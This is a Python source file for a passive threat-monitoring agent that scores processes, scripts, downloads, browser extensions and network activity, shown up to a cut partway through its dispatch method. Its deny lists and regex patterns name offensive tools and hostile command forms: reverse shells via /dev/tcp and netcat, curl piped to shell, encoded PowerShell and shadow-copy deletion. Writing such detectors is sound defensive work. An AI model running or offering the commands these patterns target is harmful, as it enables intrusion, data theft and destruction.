"""
agents/security_agent/threat_monitor.py

William / Jarvis Multi-Agent AI SaaS System
Digital Promotix

Purpose:
    Detect suspicious processes, scripts, downloads, browser extensions,
    and network behavior.

Security model:
    - This module performs detection and reporting only.
    - It does not terminate processes, delete files, block network traffic,
      uninstall extensions, quarantine files, or execute destructive actions.
    - Live system telemetry collection requires explicit permission/security
      approval.
    - All data and findings are scoped by user_id and workspace_id.
    - Results are structured for Master Agent, Security Agent, Verification
      Agent, Memory Agent, Dashboard/API, Agent Registry, and Agent Router.

Primary class:
    ThreatMonitor

Public methods:
    - run()
    - monitor()
    - analyze_snapshot()
    - scan_processes()
    - scan_scripts()
    - scan_downloads()
    - scan_browser_extensions()
    - scan_network_behavior()
    - collect_live_snapshot()
    - summarize_findings()
    - get_agent_manifest()

The module is import-safe even when optional William/Jarvis modules or psutil
are unavailable.
"""

from __future__ import annotations

import asyncio
import dataclasses
import datetime as dt
import hashlib
import inspect
import ipaddress
import json
import logging
import math
import os
import pathlib
import platform
import re
import socket
import stat
import uuid
from collections import Counter, defaultdict
from enum import Enum
from typing import (
    Any,
    Awaitable,
    Callable,
    Dict,
    Iterable,
    List,
    Mapping,
    MutableMapping,
    Optional,
    Sequence,
    Set,
    Tuple,
    Union,
)


logger = logging.getLogger(__name__)


# =============================================================================
# Optional imports and fallback compatibility
# =============================================================================

try:
    import psutil  # type: ignore
except Exception:  # pragma: no cover - optional dependency
    psutil = None  # type: ignore


try:
    from agents.base_agent import BaseAgent  # type: ignore
except Exception:  # pragma: no cover - import-safe fallback
    class BaseAgent:  # type: ignore
        """
        Minimal fallback BaseAgent.

        The real William BaseAgent may provide richer lifecycle, routing,
        registry, audit, and permission behavior. This stub keeps the file
        importable and testable before those files exist.
        """

        agent_name: str = "base_agent_fallback"

        def __init__(self, *args: Any, **kwargs: Any) -> None:
            self.agent_id = kwargs.get("agent_id", self.agent_name)
            self.config = kwargs.get("config", {})

        async def run(self, *args: Any, **kwargs: Any) -> Dict[str, Any]:
            return {
                "success": False,
                "message": "Fallback BaseAgent run() called.",
                "data": {},
                "error": "BASE_AGENT_NOT_AVAILABLE",
                "metadata": {},
            }


# =============================================================================
# Constants
# =============================================================================

AGENT_NAME = "threat_monitor"
MODULE_NAME = "Security Agent"
AGENT_VERSION = "1.0.0"

DEFAULT_MAX_FINDINGS = 500
DEFAULT_MAX_PROCESS_COUNT = 5_000
DEFAULT_MAX_DOWNLOAD_COUNT = 2_000
DEFAULT_MAX_EXTENSION_COUNT = 1_000
DEFAULT_MAX_CONNECTION_COUNT = 10_000
DEFAULT_MAX_SCRIPT_SIZE_BYTES = 2 * 1024 * 1024
DEFAULT_DOWNLOAD_AGE_HOURS = 72
DEFAULT_SCAN_TIMEOUT_SECONDS = 30

SENSITIVE_ACTIONS = {
    "collect_live_snapshot",
    "collect_processes",
    "collect_connections",
    "collect_browser_extensions",
    "collect_downloads",
    "read_command_lines",
    "read_network_connections",
    "read_browser_profiles",
}

EXECUTABLE_EXTENSIONS = {
    ".exe",
    ".dll",
    ".msi",
    ".com",
    ".scr",
    ".pif",
    ".cpl",
    ".sys",
    ".drv",
    ".app",
    ".dmg",
    ".pkg",
    ".deb",
    ".rpm",
    ".apk",
    ".jar",
}

SCRIPT_EXTENSIONS = {
    ".ps1",
    ".psm1",
    ".psd1",
    ".bat",
    ".cmd",
    ".vbs",
    ".vbe",
    ".js",
    ".jse",
    ".wsf",
    ".wsh",
    ".hta",
    ".py",
    ".pyw",
    ".sh",
    ".bash",
    ".zsh",
    ".fish",
    ".pl",
    ".rb",
    ".php",
    ".lua",
}

ARCHIVE_EXTENSIONS = {
    ".zip",
    ".rar",
    ".7z",
    ".tar",
    ".gz",
    ".tgz",
    ".bz2",
    ".xz",
    ".iso",
    ".img",
}

DOCUMENT_EXTENSIONS = {
    ".doc",
    ".docm",
    ".docx",
    ".xls",
    ".xlsm",
    ".xlsx",
    ".ppt",
    ".pptm",
    ".pptx",
    ".pdf",
    ".rtf",
    ".chm",
    ".lnk",
}

COMMON_SYSTEM_PROCESS_NAMES = {
    "system",
    "system idle process",
    "registry",
    "smss.exe",
    "csrss.exe",
    "wininit.exe",
    "services.exe",
    "lsass.exe",
    "svchost.exe",
    "winlogon.exe",
    "explorer.exe",
    "dwm.exe",
    "taskhostw.exe",
    "runtimebroker.exe",
    "searchhost.exe",
    "sihost.exe",
    "spoolsv.exe",
    "audiodg.exe",
    "conhost.exe",
    "fontdrvhost.exe",
    "securityhealthservice.exe",
    "msmpeng.exe",
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "python.exe",
    "python3",
    "python3.exe",
    "node",
    "node.exe",
    "chrome",
    "chrome.exe",
    "msedge.exe",
    "firefox",
    "firefox.exe",
    "safari",
    "code",
    "code.exe",
    "bash",
    "sh",
    "zsh",
    "fish",
    "launchd",
    "kernel_task",
    "systemd",
    "init",
    "sshd",
    "cron",
    "dbus-daemon",
    "networkmanager",
}

DEFAULT_SUSPICIOUS_PROCESS_NAMES = {
    "mimikatz",
    "mimikatz.exe",
    "procdump",
    "procdump.exe",
    "psexec",
    "psexec.exe",
    "paexec",
    "paexec.exe",
    "rubeus",
    "rubeus.exe",
    "lazagne",
    "lazagne.exe",
    "seatbelt",
    "seatbelt.exe",
    "sharpview",
    "sharpview.exe",
    "sharphound",
    "sharphound.exe",
    "bloodhound",
    "bloodhound.exe",
    "netcat",
    "netcat.exe",
    "nc",
    "nc.exe",
    "ncat",
    "ncat.exe",
    "socat",
    "socat.exe",
    "cryptominer",
    "xmrig",
    "xmrig.exe",
    "minerd",
    "minerd.exe",
}

DEFAULT_SUSPICIOUS_COMMAND_PATTERNS = (
    r"\bpowershell(?:\.exe)?\b.*\s-(?:enc|encodedcommand)\b",
    r"\bpowershell(?:\.exe)?\b.*\bfrombase64string\b",
    r"\bpowershell(?:\.exe)?\b.*\bdownloadstring\b",
    r"\bpowershell(?:\.exe)?\b.*\binvoke-expression\b",
    r"\bpowershell(?:\.exe)?\b.*\biex\b",
    r"\bpowershell(?:\.exe)?\b.*\bwebclient\b",
    r"\bpwsh(?:\.exe)?\b.*\s-(?:enc|encodedcommand)\b",
    r"\bcmd(?:\.exe)?\b.*\bcertutil\b.*-(?:decode|urlcache)\b",
    r"\bcertutil(?:\.exe)?\b.*-(?:decode|urlcache)\b",
    r"\bbitsadmin(?:\.exe)?\b.*\btransfer\b",
    r"\bmshta(?:\.exe)?\b.*(?:https?://|javascript:|vbscript:)",
    r"\brundll32(?:\.exe)?\b.*javascript:",
    r"\brundll32(?:\.exe)?\b.*url\.dll",
    r"\bregsvr32(?:\.exe)?\b.*(?:/s|/u|/i).*(?:https?://|scrobj\.dll)",
    r"\bwscript(?:\.exe)?\b.*\.(?:vbs|vbe|js|jse|wsf)\b",
    r"\bcscript(?:\.exe)?\b.*\.(?:vbs|vbe|js|jse|wsf)\b",
    r"\bpython(?:3|\.exe)?\b.*(?:base64|socket|subprocess|pty|reverse)",
    r"\bperl\b.*\bsocket\b",
    r"\bruby\b.*\b(?:tcpsocket|exec)\b",
    r"\bbash\b.*(?:/dev/tcp|/dev/udp)",
    r"\bsh\b.*(?:/dev/tcp|/dev/udp)",
    r"\bnc(?:at)?\b.*\s-[elp]\b",
    r"\bsocat\b.*(?:exec|pty|tcp-connect)",
    r"\bcurl\b.*\|\s*(?:sh|bash|zsh|python|perl|ruby)\b",
    r"\bwget\b.*\|\s*(?:sh|bash|zsh|python|perl|ruby)\b",
    r"\bchmod\b\s+\+x\b.*(?:/tmp/|/var/tmp/|/dev/shm/)",
    r"\bnohup\b.*(?:/tmp/|/var/tmp/|/dev/shm/)",
    r"\bcrontab\b.*(?:curl|wget|nc|bash\s+-c)",
    r"\bschtasks(?:\.exe)?\b.*\b/create\b",
    r"\bwmic(?:\.exe)?\b.*\bprocess\b.*\bcall\b.*\bcreate\b",
    r"\bwevtutil(?:\.exe)?\b.*\bcl\b",
    r"\bvssadmin(?:\.exe)?\b.*\bdelete\s+shadows\b",
    r"\bwbadmin(?:\.exe)?\b.*\bdelete\b",
    r"\bbcdedit(?:\.exe)?\b.*\brecoveryenabled\s+no\b",
    r"\bnetsh(?:\.exe)?\b.*\bfirewall\b.*\bdisable\b",
)

DEFAULT_SUSPICIOUS_SCRIPT_PATTERNS = (
    r"\bfrombase64string\b",
    r"\btoBase64String\b",
    r"\binvoke-expression\b",
    r"\biex\s*\(",
    r"\bdownloadstring\b",
    r"\bdownloadfile\b",
    r"\bnew-object\s+net\.webclient\b",
    r"\bsystem\.net\.webclient\b",
    r"\breflection\.assembly\b",
    r"\bvirtualalloc\b",
    r"\bcreateremotethread\b",
    r"\bwriteprocessmemory\b",
    r"\bgetprocaddress\b",
    r"\bloadlibrary\b",
    r"\bsubprocess\.(?:popen|call|run)\b",
    r"\bos\.system\s*\(",
    r"\beval\s*\(",
    r"\bexec\s*\(",
    r"\bmarshal\.loads\b",
    r"\bpickle\.loads\b",
    r"\bpty\.spawn\b",
    r"/dev/tcp/",
    r"/dev/udp/",
    r"\bsocket\.(?:socket|create_connection)\b",
    r"\bbase64\.(?:b64decode|urlsafe_b64decode)\b",
    r"\brequests\.(?:get|post)\b",
    r"\burllib\.request\.urlopen\b",
    r"\bcurl\b.*\|\s*(?:sh|bash)",
    r"\bwget\b.*\|\s*(?:sh|bash)",
    r"\breg\s+add\b.*\\run(?:once)?\b",
    r"\bschtasks\b.*\b/create\b",
    r"\bcrontab\b",
)

DEFAULT_SUSPICIOUS_DOWNLOAD_NAME_PATTERNS = (
    r"(?i)\bcrack(?:ed)?\b",
    r"(?i)\bkeygen\b",
    r"(?i)\bactivator\b",
    r"(?i)\bloader\b",
    r"(?i)\bpatcher\b",
    r"(?i)\bbypass\b",
    r"(?i)\bstealer\b",
    r"(?i)\bgrabber\b",
    r"(?i)\bminer\b",
    r"(?i)\bxmrig\b",
    r"(?i)\brat\b",
    r"(?i)\bremote.?admin\b",
    r"(?i)\bcredential\b",
    r"(?i)\bpassword.?dump\b",
    r"(?i)\bmacro.?enabled\b",
    r"(?i)\binvoice\b.*\.(?:exe|js|vbs|scr|lnk)$",
    r"(?i)\bpayment\b.*\.(?:exe|js|vbs|scr|lnk)$",
)

DEFAULT_SUSPICIOUS_EXTENSION_PERMISSIONS = {
    "debugger",
    "desktopCapture",
    "management",
    "nativeMessaging",
    "proxy",
    "webRequest",
    "webRequestBlocking",
    "privacy",
    "downloads",
    "history",
    "cookies",
    "clipboardRead",
    "clipboardWrite",
    "tabs",
    "<all_urls>",
}

DEFAULT_EXTENSION_NAME_PATTERNS = (
    r"(?i)\bfree\s+vpn\b",
    r"(?i)\bproxy\b",
    r"(?i)\bcrypto\b",
    r"(?i)\bmining\b",
    r"(?i)\bsearch\s+assistant\b",
    r"(?i)\bdownload\s+manager\b",
    r"(?i)\bcoupon\b",
    r"(?i)\bwallet\b",
    r"(?i)\bremote\b",
)

DEFAULT_SUSPICIOUS_PORTS = {
    23,
    69,
    135,
    137,
    138,
    139,
    445,
    1433,
    1521,
    2049,
    2375,
    2376,
    3306,
    3389,
    4444,
    5555,
    5900,
    5985,
    5986,
    6379,
    6667,
    8080,
    8443,
    9001,
    9050,
    9200,
    11211,
    27017,
}

DEFAULT_HIGH_RISK_TLDS = {
    ".zip",
    ".mov",
    ".top",
    ".xyz",
    ".click",
    ".work",
    ".support",
    ".rest",
    ".cam",
    ".gq",
    ".tk",
    ".ml",
    ".cf",
    ".ga",
}

DEFAULT_DYNAMIC_DNS_SUFFIXES = {
    "duckdns.org",
    "no-ip.org",
    "hopto.org",
    "ddns.net",
    "servehttp.com",
    "zapto.org",
    "sytes.net",
    "dynu.net",
    "freedns.afraid.org",
}

DEFAULT_PUBLIC_DNS_ALLOWLIST = {
    "1.1.1.1",
    "1.0.0.1",
    "8.8.8.8",
    "8.8.4.4",
    "9.9.9.9",
    "149.112.112.112",
    "208.67.222.222",
    "208.67.220.220",
}


# =============================================================================
# Enums and data models
# =============================================================================

class ThreatSeverity(str, Enum):
    """Normalized threat severity."""

    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class ThreatCategory(str, Enum):
    """Supported threat categories."""

    PROCESS = "process"
    SCRIPT = "script"
    DOWNLOAD = "download"
    BROWSER_EXTENSION = "browser_extension"
    NETWORK = "network"
    DNS = "dns"
    PERSISTENCE = "persistence"
    CREDENTIAL_ACCESS = "credential_access"
    DEFENSE_EVASION = "defense_evasion"
    RESOURCE_ABUSE = "resource_abuse"
    UNKNOWN = "unknown"


class MonitorMode(str, Enum):
    """Threat monitoring modes."""

    SNAPSHOT = "snapshot"
    LIVE = "live"
    COMPONENT = "component"


class FindingStatus(str, Enum):
    """Finding lifecycle status."""

    OPEN = "open"
    SUPPRESSED = "suppressed"
    REVIEWED = "reviewed"
    RESOLVED = "resolved"


@dataclasses.dataclass
class ThreatMonitorConfig:
    """
    Configuration for ThreatMonitor.

    Safe defaults favor passive analysis and deny live telemetry collection
    unless Security Agent approval is available.
    """

    enable_process_monitoring: bool = True
    enable_script_monitoring: bool = True
    enable_download_monitoring: bool = True
    enable_extension_monitoring: bool = True
    enable_network_monitoring: bool = True

    allow_live_collection_without_security: bool = False
    allow_command_line_collection: bool = False
    allow_username_collection: bool = False
    allow_environment_collection: bool = False
    allow_file_content_analysis: bool = False
    allow_dns_resolution: bool = False

    max_findings: int = DEFAULT_MAX_FINDINGS
    max_process_count: int = DEFAULT_MAX_PROCESS_COUNT
    max_download_count: int = DEFAULT_MAX_DOWNLOAD_COUNT
    max_extension_count: int = DEFAULT_MAX_EXTENSION_COUNT
    max_connection_count: int = DEFAULT_MAX_CONNECTION_COUNT
    max_script_size_bytes: int = DEFAULT_MAX_SCRIPT_SIZE_BYTES
    recent_download_age_hours: int = DEFAULT_DOWNLOAD_AGE_HOURS
    scan_timeout_seconds: int = DEFAULT_SCAN_TIMEOUT_SECONDS

    process_cpu_threshold: float = 85.0
    process_memory_threshold: float = 75.0
    high_connection_count_threshold: int = 100
    destination_burst_threshold: int = 30
    unique_destination_threshold: int = 50
    dns_query_burst_threshold: int = 100
    extension_permission_threshold: int = 6

    emit_events: bool = True
    audit_enabled: bool = True
    include_evidence: bool = True
    include_raw_snapshot_in_result: bool = False
    redact_command_lines: bool = True
    redact_urls: bool = True
    hash_sensitive_values: bool = True

    suspicious_process_names: Set[str] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_SUSPICIOUS_PROCESS_NAMES)
    )
    suspicious_ports: Set[int] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_SUSPICIOUS_PORTS)
    )
    suspicious_extension_permissions: Set[str] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_SUSPICIOUS_EXTENSION_PERMISSIONS)
    )
    high_risk_tlds: Set[str] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_HIGH_RISK_TLDS)
    )
    dynamic_dns_suffixes: Set[str] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_DYNAMIC_DNS_SUFFIXES)
    )
    allowed_dns_servers: Set[str] = dataclasses.field(
        default_factory=lambda: set(DEFAULT_PUBLIC_DNS_ALLOWLIST)
    )

    process_allowlist: Set[str] = dataclasses.field(default_factory=set)
    process_path_allowlist: Set[str] = dataclasses.field(default_factory=set)
    script_hash_allowlist: Set[str] = dataclasses.field(default_factory=set)
    download_hash_allowlist: Set[str] = dataclasses.field(default_factory=set)
    extension_id_allowlist: Set[str] = dataclasses.field(default_factory=set)
    domain_allowlist: Set[str] = dataclasses.field(default_factory=set)
    ip_allowlist: Set[str] = dataclasses.field(default_factory=set)
    port_allowlist: Set[int] = dataclasses.field(default_factory=set)

    process_name_denylist: Set[str] = dataclasses.field(default_factory=set)
    domain_denylist: Set[str] = dataclasses.field(default_factory=set)
    ip_denylist: Set[str] = dataclasses.field(default_factory=set)
    extension_id_denylist: Set[str] = dataclasses.field(default_factory=set)

    suspicious_command_patterns: Tuple[str, ...] = DEFAULT_SUSPICIOUS_COMMAND_PATTERNS
    suspicious_script_patterns: Tuple[str, ...] = DEFAULT_SUSPICIOUS_SCRIPT_PATTERNS
    suspicious_download_name_patterns: Tuple[str, ...] = (
        DEFAULT_SUSPICIOUS_DOWNLOAD_NAME_PATTERNS
    )
    suspicious_extension_name_patterns: Tuple[str, ...] = (
        DEFAULT_EXTENSION_NAME_PATTERNS
    )


@dataclasses.dataclass
class ThreatFinding:
    """Normalized threat finding."""

    finding_id: str
    category: str
    severity: str
    title: str
    description: str
    risk_score: float

    user_id: str
    workspace_id: str

    source_type: str
    source_id: Optional[str] = None
    rule_id: Optional[str] = None

    indicators: List[str] = dataclasses.field(default_factory=list)
    evidence: Dict[str, Any] = dataclasses.field(default_factory=dict)
    recommendations: List[str] = dataclasses.field(default_factory=list)

    process_id: Optional[int] = None
    process_name: Optional[str] = None
    file_path: Optional[str] = None
    extension_id: Optional[str] = None
    remote_address: Optional[str] = None
    remote_port: Optional[int] = None

    status: str = FindingStatus.OPEN.value
    first_seen: str = dataclasses.field(
        default_factory=lambda: _utc_now().isoformat()
    )
    last_seen: str = dataclasses.field(
        default_factory=lambda: _utc_now().isoformat()
    )

    metadata: Dict[str, Any] = dataclasses.field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding into JSON-safe dictionary."""
        return _json_safe(dataclasses.asdict(self))


@dataclasses.dataclass
class ThreatSnapshot:
    """
    Unified snapshot accepted by ThreatMonitor.

    Snapshot records must already belong to the provided user/workspace context.
    ThreatMonitor adds tenant fields to generated findings but does not trust
    tenant fields embedded in untrusted snapshot records.
    """

    processes: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
    scripts: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
    downloads: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
    browser_extensions: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
    network_connections: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
    dns_events: List[Dict[str, Any]] = dataclasses.field(default_factory=list)

    collected_at: str = dataclasses.field(
        default_factory=lambda: _utc_now().isoformat()
    )
    source: str = "provided_snapshot"
    device_id: Optional[str] = None
    session_id: Optional[str] = None
    metadata: Dict[str, Any] = dataclasses.field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert snapshot to a JSON-safe dictionary."""
        return _json_safe(dataclasses.asdict(self))


# =============================================================================
# Utility functions
# =============================================================================

def _utc_now() -> dt.datetime:
    """Return timezone-aware UTC time."""
    return dt.datetime.now(tz=dt.timezone.utc)


def _json_safe(value: Any) -> Any:
    """Convert common Python values to JSON-safe representations."""
    if dataclasses.is_dataclass(value):
        return _json_safe(dataclasses.asdict(value))

    if isinstance(value, Enum):
        return value.value

    if isinstance(value, (dt.datetime, dt.date)):
        return value.isoformat()

    if isinstance(value, pathlib.Path):
        return str(value)

    if isinstance(value, bytes):
        return value.hex()

    if isinstance(value, Mapping):
        return {str(key): _json_safe(item) for key, item in value.items()}

    if isinstance(value, (list, tuple, set, frozenset)):
        return [_json_safe(item) for item in value]

    return value


async def _maybe_await(value: Union[Any, Awaitable[Any]]) -> Any:
    """Await values that are awaitable."""
    if inspect.isawaitable(value):
        return await value
    return value


def _normalize_text(value: Any) -> str:
    """Normalize text values safely."""
    if value is None:
        return ""

    text = str(value).replace("\x00", "")
    text = re.sub(r"\s+", " ", text)
    return text.strip()


def _normalize_lower(value: Any) -> str:
    """Normalize text and lowercase it."""
    return _normalize_text(value).lower()


def _coerce_bool(value: Any, default: bool = False) -> bool:
    """Safely convert values to boolean."""
    if value is None:
        return default

    if isinstance(value, bool):
        return value

    if isinstance(value, str):
        return value.strip().lower() in {
            "1",
            "true",
            "yes",
            "y",
            "on",
            "enabled",
        }

    return bool(value)


def _coerce_int(value: Any, default: int = 0) -> int:
    """Safely convert values to integer."""
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _coerce_float(value: Any, default: float = 0.0) -> float:
    """Safely convert values to float."""
    try:
        return float(value)
    except (TypeError, ValueError):
        return default


def _parse_datetime(value: Any) -> Optional[dt.datetime]:
    """Parse supported datetime values."""
    if value is None or value == "":
        return None

    if isinstance(value, dt.datetime):
        if value.tzinfo is None:
            return value.replace(tzinfo=dt.timezone.utc)
        return value

    if isinstance(value, dt.date):
        return dt.datetime.combine(
            value,
            dt.time.min,
            tzinfo=dt.timezone.utc,
        )

    if isinstance(value, (int, float)):
        try:
            return dt.datetime.fromtimestamp(float(value), tz=dt.timezone.utc)
        except (ValueError, OSError, OverflowError):
            return None

    if isinstance(value, str):
        raw = value.strip()
        if not raw:
            return None

        normalized = raw.replace("Z", "+00:00")

        try:
            parsed = dt.datetime.fromisoformat(normalized)
            if parsed.tzinfo is None:
                parsed = parsed.replace(tzinfo=dt.timezone.utc)
            return parsed
        except ValueError:
            pass

        for date_format in (
            "%Y-%m-%d",
            "%Y-%m-%d %H:%M:%S",
            "%d-%m-%Y",
            "%m/%d/%Y",
        ):
            try:
                return dt.datetime.strptime(
                    raw,
                    date_format,
                ).replace(tzinfo=dt.timezone.utc)
            except ValueError:
                continue

    return None


def _stable_hash(value: Any) -> str:
    """Create a stable SHA-256 hash."""
    serialized = json.dumps(
        _json_safe(value),
        sort_keys=True,
        ensure_ascii=False,
        separators=(",", ":"),
    )
    return hashlib.sha256(serialized.encode("utf-8")).hexdigest()


def _short_hash(value: Any, length: int = 16) -> str:
    """Create shortened stable hash."""
    return _stable_hash(value)[: max(8, length)]


def _clamp(value: float, minimum: float = 0.0, maximum: float = 100.0) -> float:
    """Clamp numeric value."""
    return max(minimum, min(maximum, float(value)))


def _deduplicate_strings(values: Iterable[Any]) -> List[str]:
    """Deduplicate string values while preserving order."""
    seen: Set[str] = set()
    result: List[str] = []

    for value in values:
        normalized = _normalize_text(value)
        if not normalized:
            continue

        key = normalized.lower()
        if key in seen:
            continue

        seen.add(key)
        result.append(normalized)

    return result


def _compile_patterns(patterns: Iterable[str]) -> Tuple[re.Pattern[str], ...]:
    """Compile regex patterns, skipping invalid patterns safely."""
    compiled: List[re.Pattern[str]] = []

    for pattern in patterns:
        try:
            compiled.append(re.compile(pattern, re.IGNORECASE))
        except re.error:
            logger.warning("Skipping invalid threat-monitor regex: %s", pattern)

    return tuple(compiled)


def _match_patterns(
    value: str,
    patterns: Iterable[re.Pattern[str]],
) -> List[str]:
    """Return patterns that match the provided value."""
    matches: List[str] = []

    for pattern in patterns:
        try:
            if pattern.search(value):
                matches.append(pattern.pattern)
        except re.error:
            continue

    return matches


def _extract_extension(path_or_name: Any) -> str:
    """Return lowercase file extension."""
    text = _normalize_text(path_or_name)
    if not text:
        return ""

    try:
        return pathlib.Path(text).suffix.lower()
    except Exception:
        return ""


def _is_private_or_local_ip(value: Any) -> bool:
    """Return True if IP is private, loopback, link-local, or reserved."""
    text = _normalize_text(value)
    if not text:
        return False

    try:
        address = ipaddress.ip_address(text)
        return bool(
            address.is_private
            or address.is_loopback
            or address.is_link_local
            or address.is_reserved
            or address.is_multicast
            or address.is_unspecified
        )
    except ValueError:
        return False


def _is_public_ip(value: Any) -> bool:
    """Return True for valid public IP addresses."""
    text = _normalize_text(value)
    if not text:
        return False

    try:
        address = ipaddress.ip_address(text)
        return not (
            address.is_private
            or address.is_loopback
            or address.is_link_local
            or address.is_reserved
            or address.is_multicast
            or address.is_unspecified
        )
    except ValueError:
        return False


def _extract_host(value: Any) -> str:
    """Extract a host-like value from an address or URL."""
    text = _normalize_text(value).lower()
    if not text:
        return ""

    text = re.sub(r"^[a-z][a-z0-9+.-]*://", "", text)
    text = text.split("/", 1)[0]
    text = text.rsplit("@", 1)[-1]

    if text.startswith("[") and "]" in text:
        return text[1:text.index("]")]

    if text.count(":") == 1:
        host, possible_port = text.rsplit(":", 1)
        if possible_port.isdigit():
            return host

    return text.strip(".")


def _severity_from_score(score: float) -> ThreatSeverity:
    """Convert numeric risk score to severity."""
    score = _clamp(score)

    if score >= 90:
        return ThreatSeverity.CRITICAL
    if score >= 70:
        return ThreatSeverity.HIGH
    if score >= 40:
        return ThreatSeverity.MEDIUM
    if score >= 15:
        return ThreatSeverity.LOW
    return ThreatSeverity.INFO


def _safe_basename(path: Any) -> str:
    """Return safe basename from path-like value."""
    text = _normalize_text(path)
    if not text:
        return ""

    try:
        return pathlib.Path(text).name
    except Exception:
        return os.path.basename(text)


def _looks_random_name(value: Any) -> bool:
    """
    Detect names that appear machine-generated.

    This is only a weak heuristic and must never be treated as proof.
    """
    name = pathlib.Path(_normalize_text(value)).stem.lower()
    if len(name) < 10:
        return False

    compact = re.sub(r"[^a-z0-9]", "", name)
    if len(compact) < 10:
        return False

    digit_ratio = sum(character.isdigit() for character in compact) / len(compact)
    vowel_ratio = sum(character in "aeiou" for character in compact) / len(compact)
    unique_ratio = len(set(compact)) / len(compact)

    return bool(
        digit_ratio >= 0.35
        or (vowel_ratio <= 0.10 and unique_ratio >= 0.50)
    )


def _looks_like_ip_literal_host(value: Any) -> bool:
    """Return True if hostname value is an IP literal."""
    host = _extract_host(value)

    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def _is_high_risk_domain(
    domain: str,
    high_risk_tlds: Set[str],
    dynamic_dns_suffixes: Set[str],
) -> Tuple[bool, List[str]]:
    """Evaluate domain using configurable lightweight indicators."""
    host = _extract_host(domain)
    indicators: List[str] = []

    if not host:
        return False, indicators

    for suffix in high_risk_tlds:
        normalized_suffix = suffix.lower()
        if not normalized_suffix.startswith("."):
            normalized_suffix = f".{normalized_suffix}"

        if host.endswith(normalized_suffix):
            indicators.append(f"high_risk_tld:{normalized_suffix}")

    for suffix in dynamic_dns_suffixes:
        normalized_suffix = suffix.lower().strip(".")
        if host == normalized_suffix or host.endswith(f".{normalized_suffix}"):
            indicators.append(f"dynamic_dns:{normalized_suffix}")

    labels = host.split(".")
    if labels:
        first_label = labels[0]
        if _looks_random_name(first_label):
            indicators.append("algorithmic_looking_subdomain")

    if host.startswith("xn--") or ".xn--" in host:
        indicators.append("punycode_domain")

    return bool(indicators), indicators


# =============================================================================
# ThreatMonitor
# =============================================================================

class ThreatMonitor(BaseAgent):
    """
    Passive threat monitoring and analysis helper for William Security Agent.

    ThreatMonitor accepts telemetry snapshots from trusted collectors or can,
    after explicit Security Agent approval, collect limited local telemetry.

    It never performs destructive remediation. Findings include recommended
    next actions that should be routed through Security Agent, Policy Engine,
    Approval Manager, Emergency Lock, or Master Agent.
    """

    agent_name = AGENT_NAME
    module_name = MODULE_NAME
    version = AGENT_VERSION

    def __init__(
        self,
        config: Optional[Union[ThreatMonitorConfig, Mapping[str, Any]]] = None,
        security_client: Optional[Any] = None,
        verification_client: Optional[Any] = None,
        memory_client: Optional[Any] = None,
        event_emitter: Optional[Callable[..., Any]] = None,
        audit_logger: Optional[Callable[..., Any]] = None,
        telemetry_adapter: Optional[Any] = None,
        logger_instance: Optional[logging.Logger] = None,
        **kwargs: Any,
    ) -> None:
        """Initialize ThreatMonitor with safe optional integrations."""
        super().__init__(**kwargs)

        self.monitor_config = self._build_config(config)
        self.security_client = security_client
        self.verification_client = verification_client
        self.memory_client = memory_client
        self.event_emitter = event_emitter
        self.audit_logger = audit_logger
        self.telemetry_adapter = telemetry_adapter
        self.log = logger_instance or logger

        self._command_patterns = _compile_patterns(
            self.monitor_config.suspicious_command_patterns
        )
        self._script_patterns = _compile_patterns(
            self.monitor_config.suspicious_script_patterns
        )
        self._download_name_patterns = _compile_patterns(
            self.monitor_config.suspicious_download_name_patterns
        )
        self._extension_name_patterns = _compile_patterns(
            self.monitor_config.suspicious_extension_name_patterns
        )

    # =========================================================================
    # BaseAgent and architecture compatibility
    # =========================================================================

    async def run(
        self,
        task: Optional[Mapping[str, Any]] = None,
        **kwargs: Any,
    ) -> Dict[str, Any]:
        """
        BaseAgent-compatible entrypoint.

        Supported task actions:
            - monitor
            - analyze_snapshot
            - collect_live_snapshot
            - scan_processes
            - scan_scripts
            - scan_downloads
            - scan_browser_extensions
            - scan_network_behavior
            - summarize_findings
        """
        payload = dict(task or {})
        payload.update(kwargs)

        action = _normalize_lower(payload.get("action") or "monitor")

        if action in {"monitor", "scan", "full_scan"}:
            return await self.monitor(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                snapshot=payload.get("snapshot"),
                live=_coerce_bool(payload.get("live"), False),
                components=payload.get("components"),
                context=payload.get("context"),
            )

        if action in {"analyze_snapshot", "snapshot"}:
            return await self.analyze_snapshot(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                snapshot=payload.get("snapshot") or {},
                components=payload.get("components"),
                context=payload.get("context"),
            )

        if action in {"collect_live_snapshot", "collect"}:
            return await self.collect_live_snapshot(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                components=payload.get("components"),
                context=payload.get("context"),
            )

        if action == "scan_processes":
            return await self.scan_processes(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                processes=payload.get("processes") or [],
                context=payload.get("context"),
            )

        if action == "scan_scripts":
            return await self.scan_scripts(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                scripts=payload.get("scripts") or [],
                context=payload.get("context"),
            )

        if action == "scan_downloads":
            return await self.scan_downloads(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                downloads=payload.get("downloads") or [],
                context=payload.get("context"),
            )

        if action in {"scan_browser_extensions", "scan_extensions"}:
            return await self.scan_browser_extensions(
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                extensions=payload.get("extensions")
                or payload.get("browser_extensions")
                or [],
                context=payload.get("context"),
            )

        if action in {"scan_network_behavior", "scan_network"}:
            return await self.scan_network_behavior(
